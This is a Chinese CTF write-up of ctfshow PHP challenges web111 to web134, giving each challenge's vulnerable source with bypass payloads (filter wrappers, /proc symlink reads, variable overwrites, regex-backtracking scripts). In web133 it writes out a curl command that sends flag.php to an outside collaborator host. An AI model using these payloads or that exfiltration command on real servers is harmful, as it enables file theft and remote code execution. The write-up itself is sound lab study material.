## web111(GLOBALS变量绕过)

```php
highlight_file(__FILE__);
error_reporting(0);
include("flag.php");
function getFlag(&$v1,&$v2){
    eval("$$v1 = &$$v2;");
    var_dump($$v1);
}
if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];
    if(preg_match('/\~| |\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\<|\>/', $v1)){
            die("error v1");
    }
    if(preg_match('/\~| |\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\<|\>/', $v2)){
            die("error v2");
    }
    if(preg_match('/ctfshow/', $v1)){
            getFlag($v1,$v2);
    }
}
?> 
```

利用$GLOBALS变量，引用全局作用域中可用的全部变量

将$GLOBALS变量赋值给$ctfshow

```
v1=ctfshow&v2=GLOBALS
```

## web112(php伪协议)

```php
highlight_file(__FILE__);
error_reporting(0);
function filter($file){
    if(preg_match('/\.\.\/|http|https|data|input|rot13|base64|string/i',$file)){
        die("hacker!");
    }else{
        return $file;
    }
}
$file=$_GET['file'];
if(! is_file($file)){
    highlight_file(filter($file));
}else{
    echo "hacker!";
} 
```

is_file 判断给定文件名是否为一个正常的文件

php伪协议绕过

payload

```
file=php://filter/resource=flag.php
file=php://filter/convert.base32-encode/resource=flag.php
file=compress.zlib://flag.php
```

## web113(符号链接绕过)

```php
highlight_file(__FILE__);
error_reporting(0);
function filter($file){
    if(preg_match('/filter|\.\.\/|http|https|data|data|rot13|base64|string/i',$file)){
        die('hacker!');
    }else{
        return $file;
    }
}
$file=$_GET['file'];
if(! is_file($file)){
    highlight_file(filter($file));
}else{
    echo "hacker!";
}
```

非预期解

```
compress.zlib://flag.php
```

预期解

利用符号链接（软链接）

```
file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
```

`/proc/self` 表示当前进程目录，`/proc/self/root`代表根目录

如果软连接跳转的次数超过了某一个上限，Linux的lstat函数就会出错，导致PHP计算出的绝对路径就会**包含一部分软连接的路径**，也就和原始路径不相同的，就绕过了is_file函数

参考：[[CTF]proc目录的应用](http://t.csdnimg.cn/gh7Av)

## web114(php伪协议)

```php
error_reporting(0);
highlight_file(__FILE__);
function filter($file){
    if(preg_match('/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i',$file)){
        die('hacker!');
    }else{
        return $file;
    }
}
$file=$_GET['file'];
echo "师傅们居然tql都是非预期 哼！";
if(! is_file($file)){
    highlight_file(filter($file));
}else{
    echo "hacker!";
}
```

仔细观察发现没有过滤filter

```
php://filter/resource=flag.php
```

## web115(trim和is_numeric)

```php
include('flag.php');
highlight_file(__FILE__);
error_reporting(0);
function filter($num){
    $num=str_replace("0x","1",$num);
    $num=str_replace("0","1",$num);
    $num=str_replace(".","1",$num);
    $num=str_replace("e","1",$num);
    $num=str_replace("+","1",$num);
    return $num;
}
$num=$_GET['num'];
if(is_numeric($num) and $num!=='36' and trim($num)!=='36' and filter($num)=='36'){
    if($num=='36'){
        echo $flag;
    }else{
        echo "hacker!!";
    }
}else{
    echo "hacker!!!";
}
```

fuzz测试一下

```
for ($i=0;$i<=128;$i++){
    $x=chr($i).'36';
    if (trim($x)!=='36' && is_numeric($x)){
        echo urlencode($x).' ';
    }
}
```

```
%0C36 %2B36 -36 .36 036 136 236 336 436 536 636 736 836 936
```

payload：%0c36

![image-20240114163555217](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20240114163555217.png)

## web123(argv)

```php
error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
$a=$_SERVER['argv'];
$c=$_POST['fun'];
if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?/", $c)&&$c<=18){
         eval("$c".";");  
         if($fl0g==="flag_give_me"){
             echo $flag;
         }
    }
}
?> 
```

$_SERVER['argv'] 当通过 GET 方式调用时，该变量包含query string

```
http://127.0.0.1/phplab/argv.php?$flag=1
输出
array(1) {
  [0]=>
  string(7) "$flag=1"
}
```

CTF_SHOW.COM作为变量名传参时，空格、.、+、[会变成_

这里有一个漏洞，当[被换成_后，后面的就不会再转换成`_`,构造成CTF[SHOW.COM

payload：

姿势一：

```
GET:$fl0g=flag_give_me;
POST:CTF_SHOW=1&CTF[SHOW.COM=1&fun=eval($a[0])
```

parse_str将一个字符串解析成多个变量

argv会根据＋号判断元素个数

```
http://127.0.0.1/phplab/argv.php?1+fl0g+flag_give_me
输出
array(3) {
  [0]=>
  string(1) "1"
  [1]=>
  string(4) "fl0g"
  [2]=>
  string(12) "flag_give_me"
}
```

姿势二：这里就是将`flag_give_me`赋值给`fl0g`

```
GET:1+fl0g=flag_give_me
POST:CTF_SHOW=1&CTF[SHOW.COM=1&fun=parse_str($a[1])
```

姿势三：直接输出flag变量

```
POST:CTF_SHOW=1&CTF[SHOW.COM=1&fun=echo $flag
```

## web125(highlight_file)

```php
<?php
highlight_file(__FILE__);
include("flag.php");
$a=$_SERVER['argv'];
$c=$_POST['fun'];
if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i", $c)&&$c<=16){
         eval("$c".";");
         if($fl0g==="flag_give_me"){
             echo $flag;
         }
    }
}
?> 
```

多过滤了几个函数

payload：

```
GET:1=flag.php
POST:CTF_SHOW=&CTF[SHOW.COM=&fun=highlight_file($_GET[1])
```

## web126(assert)

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
$a=$_SERVER['argv'];
$c=$_POST['fun'];
if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i", $c) && strlen($c)<=16){
         eval("$c".";");  
         if($fl0g==="flag_give_me"){
             echo $flag;
         }
    }
} 
```

payload:

```
GET:?a=1+fl0g=flag_give_me
POST:CTF_SHOW=&CTF[SHOW.COM=&fun=parse_str($a[1])
or
GET:?$fl0g=flag_give_me
POST:CTF_SHOW=&CTF[SHOW.COM=&fun=assert($a[0])
```

## web127(代替_的符号)

```php
error_reporting(0);
include("flag.php");
highlight_file(__FILE__);
$ctf_show = md5($flag);
$url = $_SERVER['QUERY_STRING'];


//特殊字符检测
function waf($url){
    if(preg_match('/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\{|\;|\:|\[|\]|\}|\'|\"|\<|\,|\>|\.|\\\|\//', $url)){
        return true;
    }else{
        return false;
    }
}

if(waf($url)){
    die("嗯哼？");
}else{
    extract($_GET);
}
if($ctf_show==='ilove36d'){
    echo $flag;
}
```

payload:

```
+ 空格 [ . 这四个符号相当于_
```

```
ctf show=ilove36d
ctf%20show=ilove36d 空格
ctf%2eshow=ilove36d .
ctf%5bshow=ilove36d [
```

## web128(gettext)

```php
<?php
error_reporting(0);
include("flag.php");
highlight_file(__FILE__);

$f1 = $_GET['f1'];
$f2 = $_GET['f2'];

if(check($f1)){
    var_dump(call_user_func(call_user_func($f1,$f2)));
}else{
    echo "嗯哼？";
}

function check($str){
    return !preg_match('/[0-9]|[a-z]/i', $str);
}
```

gettext拓展的使用

在开启该拓展后 _() 等效于 gettext()

修改php.ini，extension=php_gettext.dll

```php
<?php
echo gettext("phpinfo"); //phpinfo
echo _("phpinfo"); //phpinfo
```

payload

get_defined_vars — 返回由所有已定义变量所组成的数组 这样可以获得 $flag

```
f1=_&f2=get_defined_vars
```

## web129(stripos)

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['f'])){
    $f = $_GET['f'];
    if(stripos($f, 'ctfshow')>0){
        echo readfile($f);
    }
}
```

stripos — 查找字符串首次出现的位置（不区分大小写）

目录穿越

```
payload: /ctfshow/../../../../var/www/html/flag.php
php://filter/read=convert.base64-encode|ctfshow/resource=flag.php
```

## web130、131(正则最大回溯次数绕过)

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
if(isset($_POST['f'])){
    $f = $_POST['f'];
    if(preg_match('/.+?ctfshow/is', $f)){
        die('bye!');
    }
    if(stripos($f, 'ctfshow') === FALSE){
        die('bye!!');
    }
    echo $flag;
} 
```

非预期

```
f[]=ctfshow //preg_match不处理数组直接返回false
```

利用正则最大回溯次数绕过

```py
import requests

url = 'http://d5f1a71a-d8fd-4b3e-a718-e4eb2132c5ce.challenge.ctf.show'

data = {
    'f':'very'*250000 + 'ctfshow'
}
response = requests.post(url,data=data)

print(response.text)
```

## web132(运算符优先级)

```php
<?php
include("flag.php");
highlight_file(__FILE__);

if(isset($_GET['username']) && isset($_GET['password']) && isset($_GET['code'])){
    $username = (String)$_GET['username'];
    $password = (String)$_GET['password'];
    $code = (String)$_GET['code'];

    if($code === mt_rand(1,0x36D) && $password === $flag || $username ==="admin"){
        
        if($code == 'admin'){
            echo $flag;
        }
        
    }
} 
```

访问robots.txt，查看后访问/admin得到源码

在php中&&比||先运算

优先级表

![image-20240114201713240](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20240114201713240.png)

前面两个false，满足$username ==="admin"，就为true

payload

```
code=admin&password=1&username=admin
```

## web133(无回显rce)

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
//flag.php
if($F = @$_GET['F']){
    if(!preg_match('/system|nc|wget|exec|passthru|netcat/i', $F)){
        eval(substr($F,0,6));
    }else{
        die("6个字母都还不够呀?!");
    }
```

参考：[web133](http://t.csdnimg.cn/gpP9V)

curl -F的使用

我们将F=`$F`;sleep 3，发现网站确实sleep了一会说明的确执行了命令，那么我们后面可以添加执行的命令（``相当于shell_exec()无回显）

这里相当于eval(`$F`) -->  eval(shell_exec("`$F `;sleep 3")); 

变成一道无回显的RCE

这里是先截取前六位，再执行

```
curl -F 将flag文件上传到Burp的 Collaborator Client （ Collaborator Client 类似DNSLOG，其功能要比DNSLOG强大，主要体现在可以查看 POST请求包以及打Cookies）
```

payload

```
#其中-F 为带文件的形式发送post请求
#xx是上传文件的name值，flag.php就是上传的文件
F=`$F`;+curl -X POST -F xx=@flag.php 7jrgbwpz6pzv1qfqnk11in4q2h89wzko.oastify.com
```

![image-20240114211125857](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20240114211125857.png)

## web134(POST数组的覆盖)

```php
<?php
highlight_file(__FILE__);
$key1 = 0;
$key2 = 0;
if(isset($_GET['key1']) || isset($_GET['key2']) || isset($_POST['key1']) || isset($_POST['key2'])) {
    die("nonononono");
}
@parse_str($_SERVER['QUERY_STRING']);
extract($_POST);
if($key1 == '36d' && $key2 == '36d') {
    die(file_get_contents('flag.php'));
}
```

payload

```PHP
<?php
parse_str($_SERVER['QUERY_STRING']);
var_dump($_POST);
```

```
;然后我们传入 _POST[‘a’]=123
会发现输出的结果为array(1) { ["‘a’"]=> string(3) “123” }
也就是说现在的$_POST[‘a’]存在并且值为123

题目中还有个extract($_POST)
这样的话 $a==123
```

```
_POST[key1]=36d&_POST[key2]=36d
```
